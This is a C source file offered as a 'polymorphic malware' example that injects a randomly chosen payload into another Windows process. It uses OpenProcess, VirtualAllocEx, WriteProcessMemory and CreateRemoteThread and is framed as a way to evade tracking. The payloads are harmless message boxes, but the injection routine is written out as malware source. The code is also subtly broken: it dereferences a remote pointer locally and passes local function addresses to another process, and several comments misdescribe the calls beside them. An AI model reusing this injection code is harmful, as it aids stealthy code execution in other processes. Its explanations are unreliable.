// Created July 11, 2023 - By: Devon Griffith A.K.A. rootPHAGE / 我爱数据
// Run on Windows [ gcc <path to file>\Dynamic_Resolution_Malware_Example.c -o 
// <path to file>\Dynamic_Resolution_Malware_Example.exe then run like any .exe ]
// A polymorphic malware code in C, that randomly changes what payload it injects into a process
// so that it is much harder to be tracked and monitored, staying hidden better.

#include <windows.h>  // The typical headers we need for Windows functions
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

void print_error(const char* operation) {
    DWORD errorCode = GetLastError();  // Translates GetLastError() into a friendly message
    char* message;

    FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        errorCode,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPSTR)&message,
        0,
        NULL
    ); // The message in the Windows API Function "MessageBoxA" at runtime

	printf("An error occurred while trying to %s: %s\n", operation, message);  // Error message if we fail
	LocalFree(message);  // Free the memory of the error message when it's done
}

  // Two different payload functions
void payload1() {
    MessageBoxA(NULL, "Hello, World!", "Payload1", 0);
}

void payload2() {
    MessageBoxA(NULL, "Goodbye, World!", "Payload2", 0);
}

typedef struct {  // a function pointer
	void (*payloadFunction)();
} Payload;

void inject_into_process() {
    HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 1234);  // we assume that PID:1234 is the Process ID of the target process/function

    if (process == NULL) {
        print_error("open the target process");
        return;
    }

      // Allocate memory in the target process for the Payload of our choice
    Payload* remotePayload = VirtualAllocEx(process, NULL, sizeof(Payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    
    if (remotePayload == NULL) {
        print_error("allocate memory in the target process");
        CloseHandle(process);  // Close the process handle
        return;
    }

      // Decide which payload to use based on a random number (this is the polymorphic part, as the payload changes randomly, the malware is harder to track)
    srand(time(NULL));
    int randomNumber = rand() % 2;  // Pick the random number

      // Initialize the Payload struct we defined in local memory first
    Payload localPayload;
    if (randomNumber == 0) {
        localPayload.payloadFunction = &payload1;
    } else {
        localPayload.payloadFunction = &payload2;
    }

      // Write the chosen payload to the target process's memory space
    if (!WriteProcessMemory(process, remotePayload, &localPayload, sizeof(Payload), NULL)) {
        print_error("write to the target process's memory");
        VirtualFreeEx(process, remotePayload, 0, MEM_RELEASE);  // Store our payload
        CloseHandle(process);  // Close the process handle
        return;
    }

      // Create a remote thread executing the selected payload function
    HANDLE remoteThread = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)remotePayload->payloadFunction, NULL, 0, NULL);  // Place our payload into the function's memory

    if (remoteThread == NULL) {
        print_error("create a remote thread in the target process");
        VirtualFreeEx(process, remotePayload, 0, MEM_RELEASE);  // Swap the correct memory with our payload
        CloseHandle(process);
        return;
    }

    WaitForSingleObject(remoteThread, INFINITE);  // Wait forever until the thread of the process closes

    CloseHandle(remoteThread);
    VirtualFreeEx(process, remotePayload, 0, MEM_RELEASE);  // Release the memory holding our payload until we injected it
    CloseHandle(process);
}

int main() {
    inject_into_process();  // Main function call to inject the polymorphic payload into the process
    return 0;
}

// DO NOT USE THIS SCRIPT MALICIOUSLY - PROVIDED FOR EDUCATIONAL PURPOSES ONLY
